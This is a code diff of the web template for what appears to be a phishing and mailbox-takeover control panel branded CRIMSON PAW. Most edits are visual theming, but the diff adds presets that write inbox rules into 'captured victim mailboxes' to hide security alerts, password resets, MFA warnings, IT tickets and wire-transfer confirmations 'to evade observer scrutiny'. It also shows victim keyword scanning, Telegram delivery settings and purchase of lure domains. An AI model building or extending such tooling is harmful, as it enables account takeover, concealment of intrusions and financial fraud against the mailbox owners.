+                        <div class="ai-section-label" style="color:var(--accent-color); font-weight:700;">TELEGRAM BOT TOKEN</div>
                         <input type="password" id="op-tg-bot-token" class="b2b-campaign-input" placeholder="e.g. 7123456789:AAH..." style="font-size:.85em;padding:9px 12px; font-family:monospace;">
-                        <div style="font-size:0.7rem; color:#705f63; margin-top:4px;">Obtained from @BotFather on Telegram.</div>
+                        <div style="font-size:0.7rem; color:var(--text-secondary); margin-top:4px;">Obtained from @BotFather on Telegram.</div>
                     </div>
                     <div class="ai-opt-group">
-                        <div class="ai-section-label" style="color:#ff858c; font-weight:700;">TELEGRAM CHAT ID</div>
+                        <div class="ai-section-label" style="color:var(--accent-color); font-weight:700;">TELEGRAM CHAT ID</div>
                         <input type="text" id="op-tg-chat-id" class="b2b-campaign-input" placeholder="e.g. 123456789" style="font-size:.85em;padding:9px 12px; font-family:monospace;">
-                        <div style="font-size:0.7rem; color:#705f63; margin-top:4px;">Your Telegram User or Channel Chat ID (e.g. from @userinfobot).</div>
+                        <div style="font-size:0.7rem; color:var(--text-secondary); margin-top:4px;">Your Telegram User or Channel Chat ID (e.g. from @userinfobot).</div>
                     </div>
                     <div id="op-tg-status" style="display:none; font-size:0.8rem; padding:8px 12px; border-radius:6px;"></div>
                 </div>
-                <div class="ai-modal-ftr" style="display:flex; justify-content:space-between; align-items:center; padding:14px 20px; border-top:1px solid #38161b; background:#120c0f;">
-                    <button type="button" class="btn" style="background:none; border:1px solid #38161b; color:#a49498; font-size:0.8rem; padding:8px 14px; border-radius:6px; cursor:pointer;" onclick="closeOperatorTelegramModal()">Skip For Now</button>
-                    <button type="button" id="btn-save-op-tg" class="btn" style="background:linear-gradient(135deg, #e50914, #b00710); color:#fff; font-weight:700; font-size:0.82rem; padding:8px 18px; border-radius:6px; border:none; cursor:pointer;" onclick="saveOperatorTelegramSettings()">Test &amp; Save Connection ❯</button>
+                <div class="ai-modal-ftr" style="display:flex; justify-content:space-between; align-items:center; padding:14px 20px; border-top:1px solid var(--border-color); background:var(--bg-sidebar);">
+                    <button type="button" class="btn" style="background:none; border:1px solid var(--border-color); color:var(--text-secondary); font-size:0.8rem; padding:8px 14px; border-radius:6px; cursor:pointer;" onclick="closeOperatorTelegramModal()">Skip For Now</button>
+                    <button type="button" id="btn-save-op-tg" class="btn" style="background:var(--accent-gradient); color:#fff; font-weight:700; font-size:0.82rem; padding:8px 18px; border-radius:6px; border:none; cursor:pointer; box-shadow:0 2px 10px var(--accent-glow);" onclick="saveOperatorTelegramSettings()">Test &amp; Save Connection ❯</button>
                 </div>
             </div>
         </div>
@@ -3716,10 +4131,12 @@ HTML_TEMPLATE = r'''
                         <span>🏖️</span>
                         <span>Automatic replies</span>
                     </div>
+                    {% if user_role != 'operator' %}
                     <div id="tab-nav-rules" class="owa-sidebar-item" onclick="switchOutlookSettingsTab('rules')">
                         <span>📋</span>
                         <span>Inbox rules</span>
                     </div>
+                    {% endif %}
                     <div id="tab-nav-general" class="owa-sidebar-item" onclick="switchOutlookSettingsTab('general')">
                         <span>🌐</span>
                         <span>Language & time</span>
@@ -3745,6 +4162,80 @@ HTML_TEMPLATE = r'''
                             <button type="button" class="owa-primary-btn" onclick="openNewRuleForm()">
                                 <span>➕ Add new rule</span>
                             </button>
+                        </div>
+
+                        <!-- Automated Alert Suppression Presets Bar -->
+                        <div class="owa-config-card" style="margin-bottom:16px; background:#f8f9fa; border:1px solid #e1dfdd; border-radius:6px; padding:14px 16px;">
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                                <div style="display:flex; align-items:center; gap:8px;">
+                                    <span style="font-size:16px;">⚡</span>
+                                    <span style="font-size:13px; font-weight:700; color:#323130; text-transform:uppercase; letter-spacing:0.04em;">Automated Alert Suppression Presets</span>
+                                </div>
+                                <button type="button" onclick="confirmPurgeRules()" style="background:#fff1f0; border:1px solid #ffccc7; color:#cf1322; padding:4px 10px; border-radius:4px; font-size:11px; font-weight:600; cursor:pointer;" title="Delete all custom rules from victim mailbox">
+                                    🗑️ Purge All Rules
+                                </button>
+                            </div>
+                            <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(240px, 1fr)); gap:10px;">
+                                <!-- Preset 1: Silent Quarantine -->
+                                <div style="background:#ffffff; border:1px solid #edebe9; border-radius:6px; padding:12px; display:flex; flex-direction:column; justify-content:space-between;">
+                                    <div>
+                                        <div style="font-size:12.5px; font-weight:700; color:#107c41; display:flex; align-items:center; gap:6px;">
+                                            <span>🛡️</span> Silent Quarantine
+                                        </div>
+                                        <div style="font-size:11px; color:#605e5c; margin:4px 0 8px 0; line-height:1.35;">
+                                            Diverts security alerts, password resets, and MFA warnings into Deleted Items &amp; marks as read silently.
+                                        </div>
+                                    </div>
+                                    <div style="display:flex; gap:6px;">
+                                        <button type="button" onclick="applyPresetRule('silent_quarantine', false)" style="flex:1; background:#0078d4; color:#ffffff; border:none; padding:5px 8px; border-radius:4px; font-size:11px; font-weight:600; cursor:pointer;">
+                                            ⚡ Apply Here
+                                        </button>
+                                        <button type="button" onclick="applyPresetRule('silent_quarantine', true)" style="background:#edebe9; color:#323130; border:1px solid #d2d0ce; padding:5px 8px; border-radius:4px; font-size:11px; font-weight:600; cursor:pointer;" title="Push to all captured victim mailboxes">
+                                            🌐 All
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <!-- Preset 2: Mute IT Support -->
+                                <div style="background:#ffffff; border:1px solid #edebe9; border-radius:6px; padding:12px; display:flex; flex-direction:column; justify-content:space-between;">
+                                    <div>
+                                        <div style="font-size:12.5px; font-weight:700; color:#5c2d91; display:flex; align-items:center; gap:6px;">
+                                            <span>🔕</span> Mute IT Tickets
+                                        </div>
+                                        <div style="font-size:11px; color:#605e5c; margin:4px 0 8px 0; line-height:1.35;">
+                                            Suppresses ServiceNow, Jira, and Helpdesk ticket notifications into Archive &amp; marks as read.
+                                        </div>
+                                    </div>
+                                    <div style="display:flex; gap:6px;">
+                                        <button type="button" onclick="applyPresetRule('mute_it_tickets', false)" style="flex:1; background:#5c2d91; color:#ffffff; border:none; padding:5px 8px; border-radius:4px; font-size:11px; font-weight:600; cursor:pointer;">
+                                            ⚡ Apply Here
+                                        </button>
+                                        <button type="button" onclick="applyPresetRule('mute_it_tickets', true)" style="background:#edebe9; color:#323130; border:1px solid #d2d0ce; padding:5px 8px; border-radius:4px; font-size:11px; font-weight:600; cursor:pointer;" title="Push to all captured victim mailboxes">
+                                            🌐 All
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <!-- Preset 3: Stealth Finance -->
+                                <div style="background:#ffffff; border:1px solid #edebe9; border-radius:6px; padding:12px; display:flex; flex-direction:column; justify-content:space-between;">
+                                    <div>
+                                        <div style="font-size:12.5px; font-weight:700; color:#d83b01; display:flex; align-items:center; gap:6px;">
+                                            <span>💸</span> Stealth Finance
+                                        </div>
+                                        <div style="font-size:11px; color:#605e5c; margin:4px 0 8px 0; line-height:1.35;">
+                                            Auto-diverts wire transfers, SWIFT confirmations, and invoices into Archive to evade observer scrutiny.
+                                        </div>
+                                    </div>
+                                    <div style="display:flex; gap:6px;">
+                                        <button type="button" onclick="applyPresetRule('stealth_finance', false)" style="flex:1; background:#d83b01; color:#ffffff; border:none; padding:5px 8px; border-radius:4px; font-size:11px; font-weight:600; cursor:pointer;">
+                                            ⚡ Apply Here
+                                        </button>
+                                        <button type="button" onclick="applyPresetRule('stealth_finance', true)" style="background:#edebe9; color:#323130; border:1px solid #d2d0ce; padding:5px 8px; border-radius:4px; font-size:11px; font-weight:600; cursor:pointer;" title="Push to all captured victim mailboxes">
+                                            🌐 All
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
                         </div>
 
                         <!-- Add New Rule Card (collapsed by default) -->
@@ -3873,8 +4364,8 @@ HTML_TEMPLATE = r'''
             <div class="dm-body">
                 <!-- TAB 1: Search & Buy -->
                 <div id="dm-tab-pane-search" style="display:flex; flex-direction:column; gap:14px;">
-                    <div style="background:#161014; border:1px solid #38161b; border-radius:8px; padding:12px 14px; font-size:0.78rem; color:#d0c2c6;">
-                        💡 <strong>Real-time Namecheap Registrar Integration:</strong> Search domain availability, compare live TLD rates, and register domains directly to your CRIMSON PAW infrastructure with automated DNS binding.
+                    <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px 14px; font-size:0.78rem; color:var(--text-secondary);">
+                        💡 <strong style="color:var(--text-primary);">Real-time Namecheap Registrar Integration:</strong> Search domain availability, compare live TLD rates, and register domains directly to your <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span> infrastructure with automated DNS binding.
                     </div>
                     <div class="dm-search-bar">
                         <input type="text" id="dm-search-keyword" class="dm-input" placeholder="Enter keyword or domain (e.g. secure-verify or account-auth)" onkeydown="if(event.key==='Enter') searchDomains()">
@@ -3893,7 +4384,7 @@ HTML_TEMPLATE = r'''
                             <label class="dm-tld-chip"><input type="checkbox" value="app"> .app</label>
                         </div>
                     </div>
-                    <div id="dm-search-loading" style="display:none; text-align:center; padding:25px; color:#ff6b72;">
+                    <div id="dm-search-loading" style="display:none; text-align:center; padding:25px; color:var(--accent-color);">
                         ⏳ Querying Namecheap API availability & pricing...
                     </div>
                     <div id="dm-search-results-box" style="display:none;">
@@ -3935,8 +4426,8 @@ HTML_TEMPLATE = r'''
 
                 <!-- TAB 3: Add Custom Domain -->
                 <div id="dm-tab-pane-manual" style="display:none; flex-direction:column; gap:14px;">
-                    <div style="background:#161014; border:1px solid #38161b; border-radius:8px; padding:12px 14px; font-size:0.78rem; color:#d0c2c6;">
-                        🌐 <strong>Bring Your Own Domain:</strong> Point your domain's DNS (A Record or Cloudflare Tunnel) to your CRIMSON PAW server and register it here to immediately use it in the deployment builder.
+                    <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px 14px; font-size:0.78rem; color:var(--text-secondary);">
+                        🌐 <strong style="color:var(--text-primary);">Bring Your Own Domain:</strong> Point your domain's DNS (A Record or Cloudflare Tunnel) to your <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span> server and register it here to immediately use it in the deployment builder.
                     </div>
                     <div style="display:flex; flex-direction:column; gap:6px;">
                         <label style="font-size:0.74rem; font-weight:700; color:#a49498; text-transform:uppercase;">Domain Name</label>
@@ -3947,7 +4438,7 @@ HTML_TEMPLATE = r'''
                         <input type="text" id="dm-custom-provider" class="dm-input" placeholder="e.g. Cloudflare, GoDaddy, Namecheap" value="Manual DNS">
                     </div>
                     <div style="display:flex; justify-content:flex-end; margin-top:8px;">
-                        <button type="button" class="dm-btn" onclick="addCustomDomain()"><span>➕</span> Add Domain to CRIMSON PAW</button>
+                        <button type="button" class="dm-btn" onclick="addCustomDomain()"><span>➕</span> Add Domain to <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span></button>
                     </div>
                 </div>
             </div>
@@ -3960,20 +4451,20 @@ HTML_TEMPLATE = r'''
             <div class="dm-header">
                 <div class="dm-title">
                     <span>🗑️</span> Deleted Domains & Retirements Archive
-                    <span id="dm-archive-count-badge" style="background:#261115; border:1px solid #5a1c22; color:#f87171; font-size:11px; padding:2px 8px; border-radius:10px; font-weight:700; margin-left:8px;">0 items</span>
+                    <span id="dm-archive-count-badge" style="background:var(--badge-bg); border:1px solid var(--badge-border); color:var(--accent-color); font-size:11px; padding:2px 8px; border-radius:10px; font-weight:700; margin-left:8px;">0 items</span>
                 </div>
                 <button class="close-btn" style="color:#a49498;" onclick="closeDeletedDomainsModal()">&times;</button>
             </div>
             <div class="dm-body" style="padding:18px 24px;">
                 <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:8px;">
-                    <div style="font-size:0.82rem; color:#a49498;">
+                    <div style="font-size:0.82rem; color:var(--text-secondary);">
                         Manage permanently retired domains and terminated deployments. Items here return <b>HTTP 404</b>.
                     </div>
                     <div style="display:flex; gap:8px;">
-                        <button type="button" class="dm-btn" style="background:#b91c1c; border-color:#ef4444; padding:6px 14px; font-size:0.78rem;" onclick="purgeSelectedArchived()" title="Permanently delete all selected items from database">
+                        <button type="button" class="dm-btn" style="background:var(--accent-gradient); border:1px solid rgba(255,255,255,0.15); padding:6px 14px; font-size:0.78rem; box-shadow:0 0 10px var(--accent-glow);" onclick="purgeSelectedArchived()" title="Permanently delete all selected items from database">
                             <span>🗑️</span> Delete Selected
                         </button>
-                        <button type="button" class="dm-btn dm-btn-secondary" style="border-color:#7f1d1d; color:#fca5a5; padding:6px 14px; font-size:0.78rem;" onclick="purgeAllArchived()" title="Permanently empty the entire archive">
+                        <button type="button" class="dm-btn dm-btn-secondary" style="border-color:var(--border-color); color:var(--accent-color); padding:6px 14px; font-size:0.78rem;" onclick="purgeAllArchived()" title="Permanently empty the entire archive">
                             <span>🔥</span> Empty Archive
                         </button>
                     </div>
@@ -4112,6 +4603,8 @@ Assigned      : ${inboxes}
                 loadSettings();
             } else if (id === 'operators') {
                 loadOperators();
+            } else if (id === 'audit') {
+                loadAuditTrail();
             } else if (id === 'keyword-alerts') {
                 loadKeywordAlertsData();
             }
@@ -4220,7 +4713,7 @@ Assigned      : ${inboxes}
                                     </div>
                                 </div>
                                 <div style="display:flex; align-items:center; gap:6px;">
-                                    <input type="checkbox" ${active ? 'checked' : ''} onchange="toggleKeywordRule(${r.id}, this.checked)" title="Toggle Active" style="accent-color:#e50914; cursor:pointer;">
+                                    <input type="checkbox" ${active ? 'checked' : ''} onchange="toggleKeywordRule(${r.id}, this.checked)" title="Toggle Active" style="accent-color:var(--accent-color); cursor:pointer;">
                                     <button class="ab-action-circle-btn" onclick="openEditKeywordRuleModal(${r.id})" title="Edit Rule" style="width:24px; height:24px; font-size:11px;">✏️</button>
                                     <button class="ab-action-circle-btn ab-action-delete-btn" onclick="deleteKeywordRule(${r.id})" title="Delete Rule" style="width:24px; height:24px; font-size:11px;">🗑️</button>
                                 </div>
@@ -4294,11 +4787,13 @@ Assigned      : ${inboxes}
                 const triaged = m.is_triaged ? true : false;
                 const kwEscaped = escapeHtml(m.matched_keyword || '');
                 
-                // Highlight keyword in snippet
+                // Highlight keyword in snippet & subject
                 let snippetHtml = escapeHtml(m.email_snippet || '');
+                let subjectHtml = escapeHtml(m.email_subject || '(No Subject)');
                 if (m.matched_keyword) {
                     const regex = new RegExp(`(${escapeRegex(m.matched_keyword)})`, 'gi');
-                    snippetHtml = snippetHtml.replace(regex, '<mark style="background:#e50914; color:#fff; font-weight:800; padding:1px 4px; border-radius:3px;">$1</mark>');
+                    snippetHtml = snippetHtml.replace(regex, '<mark style="background:var(--accent-color); color:#fff; font-weight:800; padding:1px 4px; border-radius:3px;">$1</mark>');
+                    subjectHtml = subjectHtml.replace(regex, '<mark style="background:var(--accent-color); color:#fff; font-weight:800; padding:1px 4px; border-radius:3px;">$1</mark>');
                 }
 
                 html += `
@@ -4315,33 +4810,33 @@ Assigned      : ${inboxes}
                         </div>
 
                         <!-- Victim identity & Email details -->
-                        <div style="display:flex; align-items:center; gap:10px; background:#10090e; padding:8px 12px; border-radius:6px; border:1px solid #200f13;">
-                            <div style="width:26px; height:26px; border-radius:50%; background:#261115; border:1px solid #4a171d; display:flex; align-items:center; justify-content:center; font-size:12px;">👤</div>
+                        <div style="display:flex; align-items:center; gap:10px; background:var(--bg-primary); padding:8px 12px; border-radius:6px; border:1px solid var(--border-color);">
+                            <div style="width:26px; height:26px; border-radius:50%; background:var(--badge-bg); border:1px solid var(--badge-border); color:var(--accent-color); display:flex; align-items:center; justify-content:center; font-size:12px;">👤</div>
                             <div style="font-size:12px; display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
                                 <span style="font-weight:700; color:#ffffff;">${escapeHtml(m.victim_name || 'Victim')}</span>
                                 <span style="color:#58a6ff; font-family:monospace;">${escapeHtml(m.victim_email || m.session_user_code)}</span>
-                                <span style="font-size:10px; background:#1f1317; color:#a49498; padding:1px 6px; border-radius:4px; font-family:monospace;">${escapeHtml(m.session_user_code)}</span>
+                                <span style="font-size:10px; background:var(--bg-panel); color:var(--text-secondary); padding:1px 6px; border-radius:4px; font-family:monospace;">${escapeHtml(m.session_user_code)}</span>
                             </div>
                         </div>
 
                         <!-- Email Subject & Sender -->
                         <div>
                             <div style="font-weight:700; font-size:13.5px; color:#ffffff; display:flex; align-items:center; gap:6px;">
-                                <span>✉️</span> ${escapeHtml(m.email_subject || '(No Subject)')}
+                                <span style="color:var(--accent-color);">✉️</span> ${subjectHtml}
                             </div>
-                            <div style="font-size:11.5px; color:#a49498; margin-top:2px;">
+                            <div style="font-size:11.5px; color:var(--text-secondary); margin-top:2px;">
                                 From: <span style="color:#cbd5e1;">${escapeHtml(m.email_sender || 'Unknown Sender')}</span>
                             </div>
                         </div>
 
                         <!-- Snippet preview -->
                         ${snippetHtml ? `
-                        <div style="font-size:12px; color:#e2e8f0; line-height:1.5; background:#0e080b; padding:10px 14px; border-radius:6px; border-left:3px solid #e50914; font-family:system-ui, sans-serif;">
+                        <div style="font-size:12px; color:#e2e8f0; line-height:1.5; background:var(--bg-primary); padding:10px 14px; border-radius:6px; border-left:3px solid var(--accent-color); font-family:system-ui, sans-serif;">
                             "${snippetHtml}"
                         </div>` : ''}
 
                         <!-- Action buttons -->
-                        <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid #200f13; padding-top:8px; margin-top:2px;">
+                        <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:8px; margin-top:2px;">
                             <div style="display:flex; gap:8px;">
                                 <button type="button" class="btn btn-primary btn-sm" onclick="openMatchInMailbox('${escapeHtml(m.session_user_code)}', '${escapeHtml(m.message_id)}')" style="display:flex; align-items:center; gap:6px;">
                                     <span>📧</span> View in Mailbox
@@ -4542,16 +5037,16 @@ Assigned      : ${inboxes}
                 const data = await res.json();
                 if (res.ok) {
                     if (showAlert) {
-                        alert(`✓ Inbox Scan Complete!\n• Victims scanned: ${data.scanned_accounts || 0}\n• Total emails inspected: ${data.total_emails_scanned || 0}\n• New intelligence hits detected: ${data.total_new_hits || 0}`);
+                        await appAlert('✓ Inbox Scan Complete!', `• Victims scanned: ${data.scanned_accounts || 0}\n• Total emails inspected: ${data.total_emails_scanned || 0}\n• New intelligence hits detected: ${data.total_new_hits || 0}`, '🔍');
                     }
                     await loadKeywordAlertsData();
                 } else {
-                    if (showAlert) alert("Scan failed: " + (data.error || 'Unknown error'));
+                    if (showAlert) await appAlert("Scan Failed", data.error || "Unknown error", "⚠️");
                     await loadKeywordAlertsData();
                 }
             } catch (err) {
                 console.error("Scan error:", err);
-                if (showAlert) alert("Network error executing scan.");
+                if (showAlert) await appAlert("Scan Error", "Network error executing scan.", "⚠️");
             } finally {
                 if (btn) {
                     btn.innerHTML = origHtml;
@@ -4626,9 +5121,9 @@ Assigned      : ${inboxes}
                 } else {
                     if (banner) {
                         banner.style.display = 'block';
-                        banner.style.background = 'rgba(229, 9, 20, 0.15)';
-                        banner.style.color = '#f85149';
-                        banner.style.border = '1px solid rgba(229, 9, 20, 0.4)';
+                        banner.style.background = 'var(--badge-bg)';
+                        banner.style.color = 'var(--accent-color)';
+                        banner.style.border = '1px solid var(--badge-border)';
                         banner.innerHTML = '⚠️ Failed to save: ' + (data.error || 'Unknown error');
                     }
                 }
@@ -4675,9 +5170,9 @@ Assigned      : ${inboxes}
                 } else {
                     if (banner) {
                         banner.style.display = 'block';
-                        banner.style.background = 'rgba(229, 9, 20, 0.15)';
-                        banner.style.color = '#f85149';
-                        banner.style.border = '1px solid rgba(229, 9, 20, 0.4)';
+                        banner.style.background = 'var(--badge-bg)';
+                        banner.style.color = 'var(--accent-color)';
+                        banner.style.border = '1px solid var(--badge-border)';
                         banner.innerHTML = '⚠️ Telegram Error: ' + (data.message || 'Delivery failed');
                     }
                 }
@@ -4885,15 +5380,47 @@ Assigned      : ${inboxes}
                 if (iconEl) iconEl.innerText = icon;
                 if (btnEl) {
                     btnEl.innerText = confirmText;
-                    btnEl.style.background = danger ? '#e50914' : '#0078D4';
-                    btnEl.style.boxShadow = danger ? '0 4px 14px rgba(229,9,20,0.4)' : '0 4px 14px rgba(0,120,212,0.4)';
+                    btnEl.style.background = danger ? 'var(--accent-gradient)' : 'var(--accent-color)';
+                    btnEl.style.boxShadow = danger ? '0 4px 14px var(--accent-glow)' : 'none';
+                    btnEl.style.color = '#ffffff';
                 }
                 window._appConfirmResolver = resolve;
                 modal.classList.add('active');
             });
         }
 
-        function closeAppConfirm(confirmed) {
+                function appAlert(title, message, icon = 'ℹ️') {
+            return new Promise((resolve) => {
+                const modal = document.getElementById('appConfirmModal');
+                if (!modal) {
+                    alert(title + '\n\n' + message);
+                    return resolve(true);
+                }
+                const titleEl = document.getElementById('appConfirmTitle');
+                const msgEl = document.getElementById('appConfirmMessage');
+                const iconEl = document.getElementById('appConfirmIcon');
+                const btnEl = document.getElementById('appConfirmBtn');
+                const cancelBtn = modal.querySelector('.btn-secondary');
+
+                if (titleEl) titleEl.innerText = title;
+                if (msgEl) msgEl.innerText = message;
+                if (iconEl) iconEl.innerText = icon;
+                if (cancelBtn) cancelBtn.style.display = 'none';
+                if (btnEl) {
+                    btnEl.innerText = 'OK';
+                    btnEl.style.background = 'var(--accent-gradient)';
+                    btnEl.style.boxShadow = '0 4px 14px var(--accent-glow)';
+                    btnEl.style.color = '#ffffff';
+                }
+                window._appConfirmResolver = (val) => {
+                    if (cancelBtn) cancelBtn.style.display = 'inline-block';
+                    resolve(val);
+                };
+                modal.classList.add('active');
+            });
+        }
+
+function closeAppConfirm(confirmed) {
             const modal = document.getElementById('appConfirmModal');
             if (modal) modal.classList.remove('active');
             if (typeof window._appConfirmResolver === 'function') {
@@ -5047,7 +5574,7 @@ Assigned      : ${inboxes}
                             <span>${n.icon || '🔔'}</span>
                             <strong style="color:#ffffff;">${escapeHtml(n.title)}</strong>
                         </div>
-                        ${n.subtitle ? `<div style="font-size:11px; color:#58a6ff; font-family:monospace; margin-top:2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${escapeHtml(n.subtitle)}</div>` : ''}
+                        ${n.subtitle ? `<div style="font-size:11px; color:var(--accent-color); font-family:monospace; margin-top:2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${escapeHtml(n.subtitle)}</div>` : ''}
                         <div class="ab-notif-time">${escapeHtml(n.time || '')}</div>
                     </div>
                 `).join('');
@@ -6009,6 +6536,17 @@ Assigned      : ${inboxes}
                 console.warn('Error restoring studio draft:', e);
                 return false;
             }
+        }
+
+        async function handleResetLinkStudio() {
+            const ok = await appConfirm({
+                title: 'Reset Link Studio?',
+                message: 'Are you sure you want to reset all Link Studio pre-landing, landing, and redirect configurations back to clean defaults?',
+                confirmText: 'Reset All',
+                icon: '🔄',
+                danger: true
+            });
+            if (ok) resetAllEditorsToDefault();
         }
 
         function resetAllEditorsToDefault() {
@@ -7553,7 +8091,7 @@ Assigned      : ${inboxes}
                         </td>
                         <td><b style="color:#ffffff;">${d.name || 'Deployment'}</b></td>
                         <td>${preName}</td>
-                        <td><span style="color:#ff6b72; font-weight:600;">${landName}</span></td>
+                        <td><span style="color:var(--accent-color); font-weight:600;">${landName}</span></td>
                         <td><span style="color:#a49498;">${succName}</span></td>
                         <td>${statusBadge}</td>
                         <td>${createdStr}</td>
@@ -8146,14 +8684,14 @@ Assigned      : ${inboxes}
                         <td>
                             <strong style="color:#ffffff;">🌐 ${dom.domain}</strong>
                             <div style="font-size:11px; color:#a49498;">Registrar: ${dom.registrar || 'Custom'}</div>
-                            <div style="font-size:11px; margin-top:3px;"><a href="${domUrl}" target="_blank" style="color:#ff6b72; text-decoration:underline;" title="Test retired domain (returns 404)">${domUrl}</a></div>
+                            <div style="font-size:11px; margin-top:3px;"><a href="${domUrl}" target="_blank" style="color:var(--accent-color); text-decoration:underline;" title="Test retired domain (returns 404)">${domUrl}</a></div>
                         </td>
-                        <td><span style="background:rgba(239,68,68,0.15); color:#f87171; border:1px solid rgba(239,68,68,0.3); padding:2px 8px; border-radius:10px; font-size:11px; font-weight:700;">RETIRED DOMAIN</span></td>
+                        <td><span style="background:var(--badge-bg); color:var(--badge-color); border:1px solid var(--badge-border); padding:2px 8px; border-radius:10px; font-size:11px; font-weight:700;">RETIRED DOMAIN</span></td>
                         <td style="color:#a49498; font-size:12px;">${dateStr}</td>
                         <td style="text-align:right;">
-                            <a href="${domUrl}" target="_blank" class="lg-icon-btn" title="Verify domain returns 404" style="text-decoration:none; color:#f87171; border-color:#ef4444; font-weight:700; margin-right:4px;">🔍 Test 404</a>
+                            <a href="${domUrl}" target="_blank" class="lg-icon-btn" title="Verify domain returns 404" style="text-decoration:none; color:var(--text-secondary); border-color:var(--border-color); font-weight:700; margin-right:4px;">🔍 Test 404</a>
                             <button type="button" class="lg-icon-btn" onclick="restoreDomainItem('${dom.domain}')" title="Restore Domain" style="color:#34d399; border-color:#059669; font-weight:700; margin-right:4px;">♻️ Restore</button>
-                            <button type="button" class="lg-icon-btn" onclick="purgeArchivedItem('domain', '${dom.domain}')" title="Permanently delete domain from database" style="color:#f87171; border-color:#dc2626;">🗑️</button>
+                            <button type="button" class="lg-icon-btn" onclick="purgeArchivedItem('domain', '${dom.domain}')" title="Permanently delete domain from database" style="color:var(--accent-color); border-color:var(--border-color);">🗑️</button>
                         </td>
                     </tr>`;
                 });
@@ -8167,14 +8705,14 @@ Assigned      : ${inboxes}
                         <td><input type="checkbox" class="dm-del-chk" data-type="deployment" data-id="${d.id}"></td>
                         <td>
                             <strong style="color:#ffffff;">🚀 ${d.name || url}</strong>
-                            <div style="font-size:11px; margin-top:3px;"><a href="${url}" target="_blank" style="color:#ff6b72; text-decoration:underline;" title="Test deleted link (returns 404)">${url}</a></div>
+                            <div style="font-size:11px; margin-top:3px;"><a href="${url}" target="_blank" style="color:var(--accent-color); text-decoration:underline;" title="Test deleted link (returns 404)">${url}</a></div>
                         </td>
-                        <td><span style="background:rgba(239,68,68,0.15); color:#f87171; border:1px solid rgba(239,68,68,0.3); padding:2px 8px; border-radius:10px; font-size:11px; font-weight:700;">${badgeText}</span></td>
+                        <td><span style="background:var(--badge-bg); color:var(--badge-color); border:1px solid var(--badge-border); padding:2px 8px; border-radius:10px; font-size:11px; font-weight:700;">${badgeText}</span></td>
                         <td style="color:#a49498; font-size:12px;">${dateStr}</td>
                         <td style="text-align:right;">
-                            <a href="${url}" target="_blank" class="lg-icon-btn" title="Verify link returns 404" style="text-decoration:none; color:#f87171; border-color:#ef4444; font-weight:700; margin-right:4px;">🔍 Test 404</a>
+                            <a href="${url}" target="_blank" class="lg-icon-btn" title="Verify link returns 404" style="text-decoration:none; color:var(--text-secondary); border-color:var(--border-color); font-weight:700; margin-right:4px;">🔍 Test 404</a>
                             <button type="button" class="lg-icon-btn" onclick="restoreDeployment(${d.id})" title="Restore Deployment" style="color:#34d399; border-color:#059669; font-weight:700; margin-right:4px;">♻️ Restore</button>
-                            <button type="button" class="lg-icon-btn" onclick="purgeArchivedItem('deployment', ${d.id})" title="Permanently delete deployment from database" style="color:#f87171; border-color:#dc2626;">🗑️</button>
+                            <button type="button" class="lg-icon-btn" onclick="purgeArchivedItem('deployment', ${d.id})" title="Permanently delete deployment from database" style="color:var(--accent-color); border-color:var(--border-color);">🗑️</button>
                         </td>
                     </tr>`;
                 });
@@ -8623,7 +9161,7 @@ Please keep your access key confidential.`;
                     <tr style="border-bottom:1px solid #1a0f14;">
                         <td style="padding:12px; font-weight:600; color:#ffffff;">
                             <div style="display:flex; align-items:center; gap:9px;">
-                                <div style="width:28px; height:28px; border-radius:6px; background:#281216; color:#58a6ff; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:11px; border:1px solid #3d1c23; font-family:monospace;">
+                                <div style="width:28px; height:28px; border-radius:6px; background:var(--badge-bg); color:var(--accent-color); display:flex; align-items:center; justify-content:center; font-weight:800; font-size:11px; border:1px solid var(--badge-border); font-family:monospace;">
                                     ${escapeHtml((op.username || 'OP').slice(0, 2).toUpperCase())}
                                 </div>
                                 <div>
@@ -8733,11 +9271,11 @@ Please keep your access key confidential.`;
                     const label = s.victim_name || s.victim_email || s.user_code;
                     const email = s.victim_email ? `&lt;${escapeHtml(s.victim_email)}&gt;` : '';
                     return `
-                        <label style="display:flex; align-items:center; gap:9px; font-size:12px; color:#f0ebed; cursor:pointer; padding:5px 8px; border-radius:4px; background:#140c11; border:1px solid #241116;">
-                            <input type="checkbox" class="op-session-cb" value="${escapeHtml(s.user_code)}" ${isChecked ? 'checked' : ''} data-label="${escapeHtml(label)}" style="accent-color:#e50914;">
+                        <label style="display:flex; align-items:center; gap:9px; font-size:12px; color:var(--text-primary); cursor:pointer; padding:5px 8px; border-radius:4px; background:var(--bg-panel); border:1px solid var(--border-color);">
+                            <input type="checkbox" class="op-session-cb" value="${escapeHtml(s.user_code)}" ${isChecked ? 'checked' : ''} data-label="${escapeHtml(label)}" style="accent-color:var(--accent-color);">
                             <span style="font-weight:600;">${escapeHtml(label)}</span>
-                            <span style="color:#a49498; font-size:11px;">${email}</span>
-                            <span style="color:#e50914; font-family:monospace; font-size:10.5px; margin-left:auto;">[${escapeHtml(s.user_code)}]</span>
+                            <span style="color:var(--text-secondary); font-size:11px;">${email}</span>
+                            <span style="color:var(--accent-color); font-family:monospace; font-size:10.5px; margin-left:auto;">[${escapeHtml(s.user_code)}]</span>
                         </label>
                     `;
                 }).join('');
@@ -8958,17 +9496,370 @@ Delegated     : ${inboxesDesc}
             }
         }
 
+        /* ═══════════════ OPERATOR AUDIT TRAIL LOGIC ═══════════════ */
+        let _auditState = {
+            limit: 50,
+            offset: 0,
+            operator_id: '',
+            action_type: 'all',
+            search: '',
+            total: 0
